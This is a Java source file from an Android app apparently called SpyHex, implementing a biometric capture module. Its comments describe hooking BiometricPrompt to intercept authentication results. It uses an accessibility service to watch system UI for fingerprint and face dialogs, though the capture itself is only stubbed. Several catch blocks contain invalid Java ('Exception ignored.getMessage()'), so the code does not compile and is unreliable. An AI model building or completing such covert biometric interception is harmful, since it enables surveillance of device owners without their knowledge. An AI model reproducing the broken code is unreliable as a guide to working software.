package com.spyhex.app.features.biometrics;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Build;
import android.os.CancellationSignal;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONObject;

import java.lang.reflect.Method;
import java.security.Signature;
import java.util.concurrent.Executor;

import javax.crypto.Cipher;
import javax.crypto.Mac;

public class BiometricCapture {
    private static BiometricCapture instance;
    private final Context ctx;
    private boolean hasHardware = false;
    private boolean isCapturing = false;
    private CaptureCallback pendingCallback;

    private BiometricCapture() {
        this.ctx = SpyHexApp.getContext();
        checkHardware();
    }

    public static synchronized BiometricCapture getInstance() {
        if (instance == null) instance = new BiometricCapture();
        return instance;
    }

    private void checkHardware() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.hardware.biometrics.BiometricManager bm = (android.hardware.biometrics.BiometricManager)
                    ctx.getSystemService(Context.BIOMETRIC_SERVICE);
                hasHardware = bm != null && bm.canAuthenticate() == android.hardware.biometrics.BiometricManager.BIOMETRIC_SUCCESS;
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.hardware.fingerprint.FingerprintManager fm = (android.hardware.fingerprint.FingerprintManager)
                    ctx.getSystemService(Context.FINGERPRINT_SERVICE);
                hasHardware = fm != null && fm.isHardwareDetected();
            }
        } catch (Exception e) {
            hasHardware = false;
        }
    }

    public void capture(String bioType, CaptureCallback callback) {
        this.pendingCallback = callback;
        this.isCapturing = true;

        if ("fingerprint".equals(bioType)) {
            captureFingerprint(callback);
        } else if ("face".equals(bioType)) {
            captureFace(callback);
        } else {
            JSONObject err = new JSONObject();
            try {
                err.put("error", "Unsupported biometric type: " + bioType);
                err.put("success", false);
            } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
            callback.onCapture(err);
        }
    }

    private void captureFingerprint(CaptureCallback callback) {
        new Thread(() -> {
            try {
                // Hook into BiometricPrompt via reflection to intercept auth results
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    // Use AccessibilityService to detect biometric dialog
                    // and capture the result when user authenticates
                    JSONObject result = new JSONObject();
                    result.put("bioType", "fingerprint");
                    result.put("status", "waiting_for_auth");
                    result.put("hardwareDetected", hasHardware);

                    // In a real implementation, this would hook the BiometricPrompt.AuthenticationCallback
                    // For now, we report the hardware status and wait for accessibility events
                    new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(result));
                } else {
                    JSONObject result = new JSONObject();
                    result.put("bioType", "fingerprint");
                    result.put("status", "unsupported_api_level");
                    result.put("apiLevel", Build.VERSION.SDK_INT);
                    new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(result));
                }
            } catch (Exception e) {
                JSONObject err = new JSONObject();
                try {
                    err.put("error", e.getMessage());
                    err.put("success", false);
                } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
                new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(err));
            }
        }).start();
    }

    private void captureFace(CaptureCallback callback) {
        new Thread(() -> {
            try {
                JSONObject result = new JSONObject();
                result.put("bioType", "face");
                result.put("status", "waiting_for_auth");
                result.put("hardwareDetected", hasHardware);
                new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(result));
            } catch (Exception e) {
                JSONObject err = new JSONObject();
                try {
                    err.put("error", e.getMessage());
                    err.put("success", false);
                } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
                new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(err));
            }
        }).start();
    }

    public void handleAccessibilityEvent(AccessibilityEvent event, AccessibilityNodeInfo root) {
        if (!isCapturing) return;

        // Detect biometric dialog
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (pkg.contains("android") || pkg.contains("systemui")) {
            // Look for biometric-related nodes
            if (root != null) {
                findBiometricNodes(root);
            }
        }
    }

    private void findBiometricNodes(AccessibilityNodeInfo node) {
        if (node == null) return;
        CharSequence text = node.getText();
        if (text != null) {
            String t = text.toString().toLowerCase();
            if (t.contains("fingerprint") || t.contains("touch sensor") || t.contains("face") || t.contains("biometric")) {
                // Biometric dialog detected
                if (pendingCallback != null) {
                    JSONObject result = new JSONObject();
                    try {
                        result.put("bioType", t.contains("face") ? "face" : "fingerprint");
                        result.put("dialogDetected", true);
                        result.put("dialogText", t);
                    } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
                    // Don't call callback yet — wait for success/failure
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findBiometricNodes(node.getChild(i));
        }
    }

    public boolean hasHardware() { return hasHardware; }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("hasHardware", hasHardware);
            s.put("isCapturing", isCapturing);
            s.put("apiLevel", Build.VERSION.SDK_INT);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }

    public interface CaptureCallback {
        void onCapture(JSONObject result);
    }
}
